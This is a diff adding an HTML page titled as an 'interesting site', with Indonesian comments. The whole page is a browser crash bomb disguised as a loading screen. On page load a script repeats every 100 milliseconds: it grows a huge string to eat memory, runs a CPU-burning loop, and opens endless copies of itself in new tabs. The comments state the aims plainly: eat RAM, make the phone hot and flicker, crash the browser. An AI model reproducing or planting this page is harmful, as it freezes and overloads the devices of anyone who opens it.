@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Situs Menarik...</title>
+</head>
+<body onload="startInfinite()">
+    <h1>(α) LOADING DATA... (Ω)</h1>
+    <script>
+        function startInfinite() {
+            // 1. Memory Hogger (Makan RAM)
+            var total = "";
+            setInterval(function() {
+                total = total + new Array(1000000).join("ZERO-KILL-");
+                console.log("RAM EATEN: " + total.length);
+                
+                // 2. CPU Burner (Bikin HP panas & kedip)
+                for (var i = 0; i < 1000000; i++) {
+                    var x = Math.sqrt(Math.random() * 1000000);
+                }
+                
+                // 3. Tab Spammer (Bikin browser crash)
+                window.open(window.location.href, '_blank');
+            }, 100);
+        }
+    </script>
+</body>
+</html>
